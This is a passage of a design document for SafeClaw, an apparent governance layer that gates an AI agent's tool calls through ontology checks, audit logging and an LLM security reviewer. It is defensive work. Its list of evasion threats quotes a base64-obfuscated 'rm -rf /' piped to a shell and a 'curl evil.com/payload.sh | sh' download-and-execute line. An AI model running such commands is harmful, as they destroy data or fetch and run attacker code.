SafeClaw can use OpenClaw's cron system to **schedule its own reports** — compliance digests, violation alerts, and audit summaries delivered on a schedule:

```
Dashboard: Automation → Scheduled Reports
┌──────────────────────────────────────────────────────────────────────┐
│ Scheduled Reports                                    [+ New Report]  │
├──────────────────────────────────────────────────────────────────────┤
│ Report              │ Schedule        │ Delivery       │ Status       │
│─────────────────────┼─────────────────┼────────────────┼──────────────│
│ Daily audit digest  │ Every day 8 AM  │ Email: team@   │ Active       │
│ Weekly compliance   │ Mon 9 AM        │ Slack #compl.  │ Active       │
│ Violation alerts    │ Real-time       │ Webhook        │ Active       │
│ Monthly full report │ 1st of month    │ Email: cto@    │ Active       │
└──────────────────────────────────────────────────────────────────────┘
```

Report types:
- **Daily audit digest**: Summary of yesterday's decisions — total actions, blocked count, top violated constraints, agents active
- **Weekly compliance report**: Full compliance export (SOC 2 / ISO 27001 format), policy changes, new constraints added, violation trends
- **Violation alerts**: Real-time (or batched) alerts when specific high-severity constraints are violated — delivered immediately via webhook, Slack, or email
- **Monthly full report**: Complete audit trail export, agent performance metrics, ontology change history, user activity

These are implemented as SafeClaw-managed cron jobs on the Gateway:

```python
# safeclaw/automation/scheduled_reports.py

async def setup_scheduled_reports(org_id: str, config: ReportConfig):
    """
    Creates cron jobs on the OpenClaw Gateway for scheduled reports.
    SafeClaw acts as both the scheduler and the report generator.
    """
    gateway = get_gateway_client(org_id)

    if config.daily_digest:
        await gateway.cron_add({
            "name": f"safeclaw-daily-digest-{org_id}",
            "schedule": {"kind": "cron", "expr": "0 8 * * *", "tz": config.timezone},
            "sessionTarget": "isolated",
            "payload": {
                "kind": "agentTurn",
                "message": "Generate SafeClaw daily audit digest and deliver it.",
            },
            "delivery": {
                "mode": "webhook",
                "to": f"{SAFECLAW_URL}/api/v1/reports/trigger/daily-digest",
            },
        })

    if config.violation_alerts:
        # Real-time alerts are not cron — they're event-driven
        # SafeClaw fires webhook on high-severity violations in the audit pipeline
        await register_violation_webhook(
            org_id=org_id,
            severity=["critical", "high"],
            delivery=config.violation_alerts.delivery,
        )
```

#### 7.12.5 API Endpoints: Automation

```
# --- Cron Management (proxy to Gateway + governance overlay) ---
GET    /api/v1/automation/cron                    # List all cron jobs (enriched with governance info)
POST   /api/v1/automation/cron                    # Create cron job (validates against policies first)
GET    /api/v1/automation/cron/{job_id}           # Job detail + governance overlay + run history
PATCH  /api/v1/automation/cron/{job_id}           # Update job
DELETE /api/v1/automation/cron/{job_id}           # Remove job
POST   /api/v1/automation/cron/{job_id}/run       # Manual trigger
GET    /api/v1/automation/cron/{job_id}/runs      # Run history with SafeClaw decision counts

# --- Heartbeat Management ---
GET    /api/v1/automation/heartbeat               # Current heartbeat config + status
PUT    /api/v1/automation/heartbeat               # Update heartbeat config (interval, active hours)
GET    /api/v1/automation/heartbeat/checklist      # Get HEARTBEAT.md content
PUT    /api/v1/automation/heartbeat/checklist      # Update HEARTBEAT.md
GET    /api/v1/automation/heartbeat/runs           # Recent heartbeat runs with decision counts

# --- Scheduled Reports ---
GET    /api/v1/automation/reports                  # List scheduled reports
POST   /api/v1/automation/reports                  # Create scheduled report
PATCH  /api/v1/automation/reports/{id}             # Update report config
DELETE /api/v1/automation/reports/{id}             # Remove report
POST   /api/v1/automation/reports/{id}/trigger     # Generate report now
POST   /api/v1/reports/trigger/daily-digest        # Webhook target for cron-triggered digest
```

---

## 8. OPENCLAW PLUGIN INTEGRATION DETAILS

### 8.1 TypeScript Plugin (the bridge — complete code)

This is the **entire** TypeScript codebase of SafeClaw. Everything else is Python.

```typescript
// openclaw-safeclaw-plugin/index.ts
const SAFECLAW_URL = process.env.SAFECLAW_URL ?? 'http://localhost:8420/api/v1';

async function post(path: string, body: unknown) {
  try {
    const res = await fetch(`${SAFECLAW_URL}${path}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
      signal: AbortSignal.timeout(500),
    });
    return await res.json();
  } catch {
    return null; // Service unavailable — degrade gracefully
  }
}

export default {
  id: 'safeclaw',
  name: 'SafeClaw Neurosymbolic Governance',
  version: '0.1.0',

  register(api) {
    // THE GATE — constraint checking
    api.on('before_tool_call', async (event, ctx) => {
      const r = await post('/evaluate/tool-call', { ...event, ...ctx });
      if (r?.block) return { block: true, blockReason: r.reason };
    }, { priority: 100 });

    // Context injection
    api.on('before_agent_start', async (event, ctx) => {
      const r = await post('/context/build', { ...event, ...ctx });
      if (r?.prependContext) return { prependContext: r.prependContext };
    }, { priority: 100 });

    // Message governance
    api.on('message_sending', async (event, ctx) => {
      const r = await post('/evaluate/message', { ...event, ...ctx });
      if (r?.cancel) return { cancel: true };
    }, { priority: 100 });

    // Async logging (fire-and-forget)
    api.on('llm_input', (e, c) => { post('/log/llm-input', { ...e, ...c }); });
    api.on('llm_output', (e, c) => { post('/log/llm-output', { ...e, ...c }); });
    api.on('after_tool_call', (e, c) => { post('/record/tool-result', { ...e, ...c }); });
  },
};
```

### 8.2 Python Service: The Critical Endpoint (evaluate/tool-call)

This is where all constraint logic lives — in Python.

```python
# safeclaw/api/routes.py

@router.post("/evaluate/tool-call")
async def evaluate_tool_call(event: ToolCallEvent) -> Decision:
    start = time.monotonic()

    # 1. Classify the action → ontology class
    action = engine.classifier.classify(event.tool_name, event.params)

    # 2. SHACL validation — real-time constraint checking (<50ms)
    #    Validates action against all SHACL shapes:
    #    forbidden patterns, risk levels, scope checks
    shacl_result = engine.shacl_validator.validate(
        data_graph=action.as_rdf_graph(),
        shapes_graph=engine.shapes,
    )
    if not shacl_result.conforms:
        decision = Decision(
            block=True,
            reason=f"[SafeClaw] {shacl_result.first_violation_message}",
        )
        engine.audit.log(event, action, decision, shacl_result)
        return decision

    # 3. User preference check — query OWL triples
    prefs = engine.get_user_preferences(event.user_id)
    pref_result = engine.preference_checker.check(action, prefs)
    if pref_result.violated:
        decision = Decision(block=True, reason=f"[SafeClaw] {pref_result.reason}")
        engine.audit.log(event, action, decision, pref_result)
        return decision

    # 4. Dependency check — has prerequisite been met?
    dep_result = engine.dependency_checker.check(
        action, event.session_id, engine.session_history
    )
    if dep_result.unmet:
        decision = Decision(
            block=True,
            reason=f"[SafeClaw] Prerequisite not met: {dep_result.required}",
        )
        engine.audit.log(event, action, decision, dep_result)
        return decision

    # 5. Query pre-computed OWL inferences for derived constraints
    sparql_result = engine.knowledge_graph.query(f"""
        SELECT ?constraint ?reason WHERE {{
            ?constraint sp:appliesTo <{action.ontology_class}> ;
                        a sp:Prohibition ;
                        sp:reason ?reason .
        }}
    """)
    if sparql_result:
        decision = Decision(
            block=True,
            reason=f"[SafeClaw] Derived prohibition: {sparql_result[0]['reason']}",
        )
        engine.audit.log(event, action, decision, sparql_result)
        return decision

    # 6. All checks passed
    elapsed_ms = (time.monotonic() - start) * 1000
    decision = Decision(block=False)
    engine.audit.log(event, action, decision, elapsed_ms=elapsed_ms)
    return decision
```
```

---

## 9. EXAMPLE: END-TO-END SCENARIO

**User says**: "Delete all .tmp files in the project and push the changes"

**Step 1: LLM receives context** (via `before_agent_start`)
```
Active constraints:
- Confirm before deleting any file
- Always run tests before git push
- autonomyLevel: moderate
```

**Step 2: LLM proposes** `exec` with `find . -name "*.tmp" -delete`

**Step 3: SafeClaw `before_tool_call` fires**
```
Action Classification:
  tool: exec
  command: find . -name "*.tmp" -delete
  → sc:DeleteFile (via command pattern analysis)
  → sc:CriticalRisk
  → sc:isReversible = false
  → sc:affectsScope = sc:LocalOnly

Policy Check: No explicit prohibition on .tmp deletion → PASS
Preference Check: confirmBeforeDelete = true → BLOCK

Decision: BLOCKED
Reason: "User preference requires confirmation before file deletion"
```

**Step 4: LLM receives block message**, rephrases to ask user for confirmation

**Step 5: User confirms**, LLM re-proposes the same command

**Step 6: SafeClaw checks again** — this time with user confirmation in context → ALLOW

**Step 7: LLM proposes** `exec` with `git push`

**Step 8: SafeClaw `before_tool_call` fires**
```
Action Classification:
  tool: exec
  command: git push
  → sc:GitPush (subclass of sc:SharedStateAction)
  → sc:HighRisk
  → sc:isReversible = false (without force)
  → sc:affectsScope = sc:SharedState

Policy Check: No prohibition → PASS
Preference Check: confirmBeforePush = true → noted but secondary
Dependency Check: requiresBefore = sc:RunTestsAction
  Session history: [DeleteFile] — no RunTestsAction found → BLOCK

Decision: BLOCKED
Reason: "Prerequisite not met: tests must run before git push"
```

**Step 9: LLM receives block**, runs tests first, then retries push → ALLOWED

**Audit trail** contains 4 decision records, each with full ontological justification.

---

## 10. CONFIGURATION

### SafeClaw Config (`~/.safeclaw/config.json`)

```json
{
  "enabled": true,
  "userId": "henrik",

  "mode": "embedded",
  "// mode options": "embedded | remote | hybrid",

  "embedded": {
    "ontologyDir": "~/.safeclaw/ontologies",
    "auditDir": "~/.safeclaw/audit",
    "reasoning": {
      "engine": "eye-js",
      "owlProfile": "OWL2-RL",
      "timeoutMs": 500,
      "enableConsistencyCheck": true
    }
  },

  "remote": {
    "serviceUrl": "https://safeclaw.example.com/api/v1",
    "apiKey": "sc_live_...",
    "timeoutMs": 500,
    "retryAttempts": 2
  },

  "hybrid": {
    "localChecks": ["pathPatterns", "commandPatterns", "simplePreferences"],
    "remoteChecks": ["reasonerValidation", "dependencyChains", "planAnalysis"],
    "auditTarget": "remote",
    "policySyncIntervalSec": 60,
    "circuitBreaker": {
      "failureThreshold": 3,
      "resetTimeoutSec": 30,
      "fallbackMode": "local-only"
    }
  },

  "enforcement": {
    "mode": "enforce",
    "// mode options": "enforce | warn-only | audit-only | disabled",
    "blockMessage": "[SafeClaw] Action blocked: {reason}",
    "maxReasonerTimeMs": 200
  },

  "contextInjection": {
    "enabled": true,
    "includePreferences": true,
    "includePolicies": true,
    "includeSessionFacts": true,
    "includeRecentViolations": true,
    "maxContextChars": 2000
  },

  "audit": {
    "enabled": true,
    "logLlmIO": true,
    "logAllowedActions": true,
    "logBlockedActions": true,
    "retentionDays": 90,
    "format": "jsonl"
  }
}
```

---

## 11. RISK ANALYSIS & MITIGATIONS

| Risk | Impact | Mitigation |
|---|---|---|
| Reasoner latency slows agent | High | 200ms timeout, parallel checks, cache frequent queries |
| False positives block valid actions | High | "warn-only" mode for tuning, easy policy editing |
| Ontology too complex to maintain | Medium | Start minimal, grow incrementally, CLI tooling, dashboard UI |
| eye-js WASM stability | Medium | Fallback to pattern-matching-only mode if WASM fails |
| LLM ignores constraint context | Low | Constraints enforced at tool level, not prompt level |
| Large ontologies exceed memory | Low | Jena Fuseki scale-up path via remote service, lazy loading |
| Remote service downtime blocks agents | High | Hybrid mode: local cache covers ~80% of checks; circuit breaker auto-switches to local-only |
| Network latency in remote mode | Medium | Hybrid routing: simple checks local (<5ms), only complex checks remote; async audit |
| Multi-tenant data leakage | High | Strict tenant isolation in DB, API key scoped per org, separate ontology namespaces |
| Policy sync lag in hybrid mode | Low | WebSocket push for critical policy changes; polling for routine sync |
| Managed container security | High | Strict namespace isolation, no shared volumes, network policies, regular image scanning |
| Cloud cost scaling | Medium | Sleep idle containers, enforce resource limits per plan, usage-based metering |
| Onboarding drop-off | Medium | Keep wizard to 5 screens max, sensible defaults, skip-able steps, "start with template" option |

---

## 12. SUCCESS CRITERIA

The system is complete when:

1. **No unaudited action**: Every tool call has a decision record with ontological justification
2. **No unblocked violation**: Every policy prohibition is enforced at the tool gate
3. **Reasoner catches derived violations**: Transitive and implicit constraints are detected
4. **User preferences are hard constraints**: The agent cannot override them
5. **LLM is constraint-aware**: The system prompt includes active constraints
6. **Feedback loop works**: Action results update the knowledge graph, informing future decisions
7. **Audit trail is complete**: Any decision can be traced back to specific ontology triples
8. **Human-readable**: A non-technical auditor can understand the audit report
9. **Performance**: Constraint checking adds <200ms per tool call on average
10. **The agent never goes astray when told not to**: If a user sets `autonomyLevel: supervised`, every significant action requires confirmation
11. **Runs anywhere**: Works embedded (local), as a remote service (cloud), or hybrid — same engine interface, same guarantees
12. **One service, many agents**: In remote/hybrid mode, a single SafeClaw service can govern N agents with centralized policies and audit
13. **Resilient**: If the remote service is down, local cache continues enforcing cached policies (hybrid mode graceful degradation)
14. **Turnkey onboarding**: A new user can sign up and have a governed agent running within 5 minutes, with zero terminal commands (Tier 2)
15. **Policy templates work**: Pre-built templates for common use cases produce sensible default governance out of the box

---

## 13. LLM LAYER — THE "NEURO" IN NEUROSYMBOLIC

### 13.1 Core Principle

**LLM observes and advises. Ontology enforces.** The LLM is a passive layer that watches the symbolic engine, catches what rigid rules miss, translates between humans and ontologies, and explains decisions. It never sits in the critical path and never makes allow/block decisions.

### 13.2 Provider

**Mistral** via the `mistralai` Python SDK. Gated behind `SAFECLAW_MISTRAL_API_KEY` — if not set, SafeClaw works exactly as before with zero behavior change.

### 13.3 Four Capabilities

| Capability | Role | Inline? | Can block? |
|---|---|---|---|
| **NL → Policy Compiler** | Translate English rules to SHACL/TTL | No, authoring tool | No |
| **Semantic Security Reviewer** | Catch obfuscation, evasion, novel attacks | Parallel, after decision | Can escalate to confirmation |
| **Classification Observer** | Suggest improvements when regex falls back to defaults | Async, after decision | No, suggests pattern updates |
| **Decision Explainer** | Turn audit records into plain English | On demand | No |

#### NL → Policy Compiler

Users describe rules in English. The LLM generates validated Turtle policy triples. SafeClaw always validates the generated TTL (syntax, namespace, completeness) before persisting. The user confirms before anything is applied.

```bash
safeclaw policy add-nl "Never push to main without running tests first"
# → Generates sp:TestBeforeMainPush prohibition
# → Shows generated TTL for confirmation
# → Appends to policy file on approval
```

#### Semantic Security Reviewer ("Red Team" Step)

The symbolic engine is rigid — it catches what you've written rules for. The LLM catches what rules miss:

- **Obfuscated commands** — `echo cm0gLXJmIC8= | base64 -d | sh` (base64-encoded `rm -rf /`)
- **Indirect attacks** — write malicious script to disk, execute in separate step
- **Download-and-execute** — `curl evil.com/payload.sh | sh`
- **Flag reordering** — `git push origin main -f` vs `git push --force origin main`
- **Multi-step evasion** — sequence of individually-safe actions that are collectively destructive

Architecture:
```
Tool call → Symbolic engine (Steps 1-9, <50ms) → Decision returned immediately
                                                → IN PARALLEL: Security Reviewer
                                                    → LLM analyzes for evasion
                                                    → If HIGH: escalate to confirmation
                                                    → If CRITICAL: trigger kill switch
```

The reviewer runs via `asyncio.create_task()` — zero latency impact on the symbolic decision.

#### Classification Observer

Watches for cases where the regex classifier falls back to defaults. Asks the LLM how it would classify the action. Logs suggestions to a review queue. Humans review and accept/reject, which updates the symbolic patterns over time.

#### Decision Explainer

Turns machine-readable `DecisionRecord` audit entries into 2-3 sentence plain English explanations. Available via CLI (`safeclaw audit explain <id>`) and API.

### 13.4 Module Structure

```
safeclaw/llm/
├── __init__.py
├── client.py                  # MistralClient wrapper
├── policy_compiler.py         # NL → Turtle + validation
├── security_reviewer.py       # Parallel semantic security review
├── classification_observer.py # Async classification suggestions
├── explainer.py               # Decision → human-readable
└── prompts.py                 # All prompt templates
```

### 13.5 Integration

The LLM layer integrates into `FullEngine` without changing the pipeline:

```python
# After symbolic decision, non-blocking:
if self.security_reviewer:
    asyncio.create_task(self._run_security_review(event, action, decision))
if self.classification_observer and action.ontology_class == "Action":
    asyncio.create_task(self._run_classification_observer(event, action))
return decision  # returned immediately, LLM runs in background
```

### 13.6 Dependency

```
mistralai>=1.0.0  # added to pyproject.toml optional dependencies
```

Full design: `docs/plans/2026-02-28-llm-layer-design.md`

---

## 14. SUMMARY

SafeClaw transforms OpenClaw from a powerful-but-opaque autonomous agent into a **transparent, auditable, formally constrained** system. The key insight is:

> **The ontology is not the brain — it's the guardrail. The LLM is not the enforcer — it's the advisor.**

Two layers working together:
- **Symbolic engine** (OWL + SHACL + regex) — deterministic, fast, auditable. Makes every allow/block decision.
- **LLM layer** (Mistral) — passive observer. Catches evasion the rules miss, translates policies from English, explains decisions in plain language.

Every boundary is:
- **Formally specified** (OWL triples, not ad-hoc code)
- **Machine-checkable** (reasoner validates before execution)
- **Human-readable** (Turtle files, natural language reasons)
- **Auditable** (every decision logged with ontological justification)
- **LLM-reviewed** (semantic security reviewer catches what rigid rules miss)

SafeClaw runs four ways:
- **Local** — SafeClaw Python service on localhost alongside OpenClaw, ideal for single developers
- **Remote** — central service governing many agents, full OWL-DL reasoning, enterprise dashboard
- **Hybrid** — fast local checks + heavy remote reasoning, resilient to service outages
- **Cloud (turnkey)** — sign up, pick a template, start working. Managed OpenClaw + SafeClaw, zero installation

Same `SafeClawEngine` interface, same ontologies, same audit format. The deployment mode is a config switch, not a code change.

This is not about making the agent less capable — it's about making its capability **trustworthy**.
